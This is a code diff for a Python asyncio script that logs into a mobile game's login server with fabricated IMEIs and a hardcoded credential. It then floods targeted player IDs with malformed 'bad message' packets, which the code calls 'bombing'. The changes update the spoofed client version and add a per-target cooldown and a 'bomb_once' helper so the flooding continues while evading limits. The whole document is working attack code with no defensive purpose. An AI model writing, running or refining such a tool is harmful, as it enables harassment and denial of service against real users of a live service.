@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
+import time
 import random
 import asyncio
 import socket
@@ -39,7 +40,7 @@ async def user_do(username, imei, passwd='V0\/wJekk6Kk=', proxy=None):
             assert r["code"] == 100
     return r['uid'], r['token']
 
-async def login_verify(user_id, token, version='1.6.61095', proxy=None):
+async def login_verify(user_id, token, version='1.7.61848', proxy=None):
     # return tcp session
     url = 'http://sgz-login.fingerfunol.com:30006/entry_server/login_verify?version=%s&server_id=20&userid=%s&channel=4&session=%s&platform=a8card&isdebug=False&activation_code=' % (version, user_id, token)
     async with aiohttp.ClientSession() as session:
@@ -103,7 +104,7 @@ async def read_one(reader):
 async def one(loop, email, wait=0):
     """maintance one bomb sender"""
     imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
-    version = "1.6.61095"
+    version = "1.7.61848"
     uid, token, session = None, None, None
     if wait:
         await asyncio.sleep(wait)
@@ -129,26 +130,29 @@ async def one(loop, email, wait=0):
             writer.write(b'\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x07\x00\x01\x00\x00\x00\x00\x07')
             asyncio.ensure_future(heartbeat(writer), loop=loop)
             asyncio.ensure_future(ws_updater(), loop=loop)
-            i = 0
-            targets = []
             bomb_times = 0
+            bomb_record = dict()
             while True:
-                i += 1
+                i = 0
+                threshold = 17
                 for receiver, t in pool.items():
-                    receiver = int(receiver)
-                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 4))
-                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 5))
-                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 6))
-                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 7))
-                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 8))
-                if pool:
-                    print(email, "bomb end------->>>>>>>round:", bomb_times)
-                    await writer.drain()
-                    bomb_times += 1
-                    if bomb_times%5 == 0:
-                        await asyncio.sleep(random.randint(15, 20))
-                else:
-                    await asyncio.sleep(1)
+                    now = time.time()
+                    last_bomb_time = bomb_record.get(receiver, None)
+                    if last_bomb_time and now - last_bomb_time < threshold:
+                        # just bombed, skip this one
+                        print("bombed !!!", now, last_bomb_time)
+                        continue
+                    i += 1
+                    await bomb_once(writer, receiver)
+                    await bomb_once(writer, receiver)
+                    await bomb_once(writer, receiver)
+                    await bomb_once(writer, receiver)
+                    await bomb_once(writer, receiver)
+                    bomb_record[receiver] = now
+                # now everyone in pool has been bombed recently
+                if i:
+                    print(i, "in pool has been bombed. Total", len(pool))
+                await asyncio.sleep(1)
         except BrokenPipeError:
             import traceback
             print(traceback.format_exc())
@@ -156,6 +160,16 @@ async def one(loop, email, wait=0):
         except:
             import traceback
             print("wtf!!!!", traceback.format_exc())
+
+
+async def bomb_once(writer, target_id):
+    receiver = int(target_id)
+    writer.write(make_bad_msg_data(char_gen()*1, receiver, 4))
+    writer.write(make_bad_msg_data(char_gen()*1, receiver, 5))
+    writer.write(make_bad_msg_data(char_gen()*1, receiver, 6))
+    writer.write(make_bad_msg_data(char_gen()*1, receiver, 7))
+    writer.write(make_bad_msg_data(char_gen()*1, receiver, 8))
+    await writer.drain()
 
 
 async def count_down(sec):
